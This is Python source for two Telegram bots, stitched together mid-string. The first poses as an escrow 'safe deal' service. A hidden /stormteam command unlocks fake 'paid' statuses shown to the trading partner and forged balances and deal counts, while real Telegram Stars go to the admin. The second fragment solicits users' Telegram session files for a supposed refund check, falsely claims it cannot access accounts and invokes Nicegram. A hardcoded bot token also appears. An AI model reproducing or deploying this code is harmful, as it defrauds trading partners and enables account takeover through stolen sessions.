import asyncio
import logging
import uuid
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, 
    Message, LabeledPrice, PreCheckoutQuery
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# Замените на ваш токен бота
BOT_TOKEN = '8386284542:AAGBhArwt3E8gChPEXoNKkmUrrGG-osn3tQ'
# Username бота для deep links (без @)
BOT_USERNAME = 'Save_Deal_Bot'
# ID админа (@wonderfullblyat) - замените на реальный user_id
ADMIN_USER_ID = 8380341609  # Получите через @userinfobot

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Состояния FSM
class DealStates(StatesGroup):
    waiting_rubles = State()
    waiting_stars = State()

# Хранилища данных
user_data = {}  # {user_id: {'balance': 0, 'deals': 0}}
authorized_users = set()  # Пользователи, выполнившие /stormteam
pending_deals = {}  # {deal_id: {'creator_id': id, 'stars': int}}  # Добавили stars
active_deals = {}  # {user_id: {'partner_id': id, 'stars': int}}
payment_status = {}  # { (user1_id, user2_id): {'paid': {user1: False, user2: False}} }
deal_states = {}  # {user_id: state_context}

def get_user_data(user_id: int):
    if user_id not in user_data:
        user_data[user_id] = {'balance': 0, 'deals': 0}
    return user_data[user_id]

def get_or_create_payment_status(user1: int, user2: int):
    key = tuple(sorted([user1, user2]))
    if key not in payment_status:
        payment_status[key] = {'paid': {user1: False, user2: False}}
    return payment_status[key]

@dp.message(Command('start'))
async def start_handler(message: Message):
    args = message.text.split(maxsplit=1)
    if len(args) > 1 and args[1].startswith('join_'):
        deal_id = args[1][5:]  # join_dealid
        if deal_id in pending_deals:
            creator_id = pending_deals[deal_id]['creator_id']
            stars = pending_deals[deal_id]['stars']
            if creator_id != message.from_user.id:
                # Соединяем
                del pending_deals[deal_id]
                active_deals[creator_id] = {'partner_id': message.from_user.id, 'stars': stars}
                active_deals[message.from_user.id] = {'partner_id': creator_id, 'stars': stars}
                
                # Инициализируем статус оплаты
                get_or_create_payment_status(creator_id, message.from_user.id)
                
                # Отправляем статусы обоим
                status_text = "Статус оплаты собеседника  : ❌️\nВаш статус оплаты : ❌️"
                await bot.send_message(creator_id, status_text)
                await bot.send_message(message.from_user.id, status_text)
                
                await message.answer("Вы подключились к сделке! Ожидайте оплаты.")
            else:
                await message.answer("Вы уже создали эту сделку.")
        else:
            await message.answer("Сделка не найдена или уже завершена.")
    else:
        await show_menu(message)

@dp.message(Command('menu'))
async def menu_handler(message: Message):
    await show_menu(message)

async def show_menu(message: Message):
    user_id = message.from_user.id
    data = get_user_data(user_id)
    menu_text = f"Текущий баланс 💰:{data['balance']}₽\nАктивные сделки 💳 :{data['deals']}\n\nTelegram-бот для автоматизации и контроля сделок."
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Пополнить 💸")],
            [KeyboardButton(text="Начать сделку 🪙")]
        ],
        resize_keyboard=True
    )
    await message.answer(menu_text, reply_markup=keyboard)

@dp.message(lambda message: message.text == "Пополнить 💸")
async def replenish_handler(message: Message):
    text = "Чтобы пополнить счет оплатите 1$ на счет http://t.me/send?start=IVUokMDdN2lF"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_menu")]
    ])
    await message.answer(text, reply_markup=keyboard)

@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery):
    await show_menu(callback.message)
    await callback.answer()

@dp.message(lambda message: message.text == "Начать сделку 🪙")
async def start_deal_handler(message: Message, state: FSMContext):
    await message.answer("На какую сумму вы оформляете сделку?")
    await state.set_state(DealStates.waiting_rubles)
    deal_states[message.from_user.id] = state

@dp.message(DealStates.waiting_rubles)
async def rubles_handler(message: Message, state: FSMContext):
    try:
        rubles = int(message.text)
        await state.update_data(rubles=rubles)
        await message.answer("На сколько звезд вы оформляете сделку?")
        await state.set_state(DealStates.waiting_stars)
    except ValueError:
        await message.answer("Введите число рублей.")

@dp.message(DealStates.waiting_stars)
async def stars_handler(message: Message, state: FSMContext):
    try:
        stars = int(message.text)
        data = await state.get_data()
        rubles = data['rubles']
        
        # Генерируем уникальный deal_id
        deal_id = str(uuid.uuid4())
        pending_deals[deal_id] = {'creator_id': message.from_user.id, 'stars': stars}
        
        link = f"https://t.me/{BOT_USERNAME}?start=join_{deal_id}"
        
        await message.answer(f"Ожидайте подключение собеседника, ваша ссылка: {link}")
        
        await state.clear()
        if message.from_user.id in deal_states:
            del deal_states[message.from_user.id]
    except ValueError:
        await message.answer("Введите число звезд.")

# НОВАЯ КОМАНДА: /pay - для оплаты звёздами (заменяет старый /pay)
@dp.message(Command('pay'))
async def pay_handler(message: Message):
    user_id = message.from_user.id
    if user_id not in active_deals:
        await message.answer("Вы не в активной сделке. Используйте /menu для начала.")
        return
    
    deal_info = active_deals[user_id]
    if deal_info['partner_id'] not in active_deals:
        await message.answer("Сделка не активна.")
        return
    
    stars = deal_info['stars']
    partner_id = deal_info['partner_id']
    
    # Создаём инвойс для Stars
    prices = [LabeledPrice(label=f"{stars} Звёзд", amount=stars)]  # amount в минимальных единицах (1 star = 1)
    
    # Клавиатура с кнопкой оплаты
    payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Оплатить {stars} ⭐", pay=True)]
    ])
    
    await message.answer_invoice(
        title="Оплата сделки звёздами",
        description=f"Оплатите {stars} Telegram Stars для завершения сделки.",
        payload=f"deal_{user_id}_{partner_id}_{stars}",  # Уникальный payload
        currency="XTR",  # Telegram Stars
        prices=prices,
        reply_markup=payment_keyboard,
        provider_token="",  # Пусто для Stars
        need_name=False,
        need_phone_number=False,
        need_email=False,
        need_shipping_address=False,
        send_phone_number_to_provider=False,
        send_email_to_provider=False,
        is_flexible=False
    )

# ОБРАБОТКА PRE-CHECKOUT QUERY (новое)
@dp.pre_checkout_query()
async def pre_checkout_query_handler(pre_checkout: PreCheckoutQuery):
    # Для Stars всегда одобряем (без доп. проверок)
    await bot.answer_pre_checkout_query(pre_checkout.id, ok=True)

# ОБРАБОТКА УСПЕШНОГО ПЛАТЕЖА (новое)
@dp.message(F.successful_payment)
async def successful_payment_handler(message: Message):
    user_id = message.from_user.id
    sp = message.successful_payment
    
    # Парсим payload для проверки (опционально)
    payload = sp.invoice_payload
    if not payload.startswith("deal_"):
        await message.answer("Ошибка: неверный платёж.")
        return
    
    # Обновляем статус оплаты для этого пользователя
    if user_id in active_deals:
        deal_info = active_deals[user_id]
        partner_id = deal_info['partner_id']
        status = get_or_create_payment_status(user_id, partner_id)
        status['paid'][user_id] = True
        
        # Уведомляем админа
        await bot.send_message(
            ADMIN_USER_ID, 
            f"Боту скинули подарок: {sp.total_amount} {sp.currency} от пользователя {user_id} (charge_id: {sp.provider_payment_charge_id})"
        )
        
        # Обновляем статусы для обоих
        paid_sender = status['paid'][user_id]
        paid_partner = status['paid'][partner_id]
        
        sender_text = f"Статус оплаты собеседника : {'✅️' if paid_partner else '❌️'}\nВаш статус оплаты : {'✅️' if paid_sender else '❌️'}"
        partner_text = f"Статус оплаты собеседника : {'✅️' if paid_sender else '❌️'}\nВаш статус оплаты : {'✅️' if paid_partner else '❌️'}"
        
        await bot.send_message(user_id, sender_text)
        await bot.send_message(partner_id, partner_text)
        
        await message.answer("Платёж принят! Статус обновлён. Ожидайте завершения сделки.")
    else:
        await message.answer("Платёж принят, но вы не в активной сделке.")

@dp.message(Command('stormteam'))
async def stormteam_handler(message: Message):
    authorized_users.add(message.from_user.id)
    await message.answer("Доступ к командам предоставлен!")

@dp.message(Command('salling'))
async def salling_handler(message: Message):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Доступ запрещен. Используйте /stormteam.")
        return
    
    if user_id not in active_deals:
        await message.answer("Вы не в активной сделке.")
        return
    
    partner_id = active_deals[user_id]['partner_id']
    status = get_or_create_payment_status(user_id, partner_id)
    status['paid'][user_id] = True  # Этот пользователь "оплатил" (рубли?)
    
    # Обновляем текст для обоих
    paid_sender = status['paid'][user_id]
    paid_partner = status['paid'][partner_id]
    
    sender_text = f"Статус оплаты собеседника : {'✅️' if paid_partner else '❌️'}\nВаш статус оплаты : {'✅️' if paid_sender else '❌️'}"
    await bot.send_message(user_id, sender_text)
    
    partner_text = f"Статус оплаты собеседника : {'✅️' if paid_sender else '❌️'}\nВаш статус оплаты : {'✅️' if paid_partner else '❌️'}"
    await bot.send_message(partner_id, partner_text)

@dp.message(Command('ok'))
async def ok_handler(message: Message):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Доступ запрещен. Используйте /stormteam.")
        return
    
    if user_id not in active_deals:
        await message.answer("Нет активной сделки.")
        return
    
    partner_id = active_deals[user_id]['partner_id']
    del active_deals[user_id]
    if partner_id in active_deals:
        del active_deals[partner_id]
    
    # Увеличиваем счетчик сделок
    get_user_data(user_id)['deals'] += 1
    get_user_data(partner_id)['deals'] += 1
    
    # Очищаем статус
    key = tuple(sorted([user_id, partner_id]))
    if key in payment_status:
        del payment_status[key]
    
    await message.answer("Сделка завершена!")
    await bot.send_message(partner_id, "Сделка завершена!")

@dp.message(Command('balance'))
async def balance_handler(message: Message):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Доступ запрещен. Используйте /stormteam.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /balance <сумма>")
        return
    
    try:
        amount = int(args[1])
        data = get_user_data(user_id)
        data['balance'] = amount
        await message.answer(f"Баланс обновлен: {amount}₽")
    except ValueError:
        await message.answer("Введите целое число.")

@dp.message(Command('deals'))
async def deals_handler(message: Message):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Доступ запрещен. Используйте /stormteam.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /deals <число>")
        return
    
    try:
        count = int(args[1])
        data = get_user_data(user_id)
        data['deals'] = count
        await message.answer(f"Количество сделок обновлено: {count}")
    except ValueError:
        await message.answer("Введите целое число.")

# ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ (обязательные для Stars)
@dp.message(Command('terms'))
async def terms_handler(message: Message):
    await message.answer("Условия использования: [ваш текст].")

@dp.message(Command('support'))
async def support_handler(message: Message):
    await message.answer("Поддержка: @your_support.")

# Запуск бота
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())    "📂 Пожалуйста, отправьте файл сессии (.txt или .zip) для проверки на рефаунд."
)

SAFE_TEXT = (
    "Почему это безопасно?\n\n"
    "Бот выполняет только проверку статуса возврата подарков в Telegram.\n"
    "Мы не запрашиваем и не обрабатываем ваши личные данные или доступ к аккаунту.\n\n"
    "Проверка осуществляется автоматически по информации о подарках, доступной в Telegram, "
    "чтобы определить, можно ли вернуть звёзды за подарок в течение 21 дня после отправки.\n\n"
    "Все действия выполняются безопасно и без вмешательства в ваш аккаунт.\n\n"
    "🔗 Официальный канал Nicegram: https://t.me/nicegramapp"
)


async def main():
    bot = Bot(BOT_TOKEN)
    dp = Dispatcher()

    # --- /start ---
    @dp.message(CommandStart())
    async def start(msg: Message):
        await msg.answer(MAIN_TEXT, reply_markup=menu_kb)

    # --- Обработка кнопок ---
    @dp.callback_query(F.data == "instr")
    async def instr(clb):
        await clb.message.answer(INSTR_TEXT)
        await clb.answer()

    @dp.callback_query(F.data == "check")
    async def check(clb):
        await clb.message.answer(CHECK_TEXT)
        await clb.answer()

    @dp.callback_query(F.data == "safe")
    async def safe(clb):
        await clb.message.answer(SAFE_TEXT)
        await clb.answer()

    # --- Получение файла ---
    @dp.message(F.document)
    async def get_file(msg: Message):
        ext = msg.document.file_name.split(".")[-1].lower()

        if ext not in ["txt", "zip"]:
            await msg.answer("❌ Нужен файл .txt или .zip")
            return

        await msg.answer("✅ Файл получен! Начинаю проверку...")
        # Здесь ты делаешь свою проверку файла
        # ...

    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())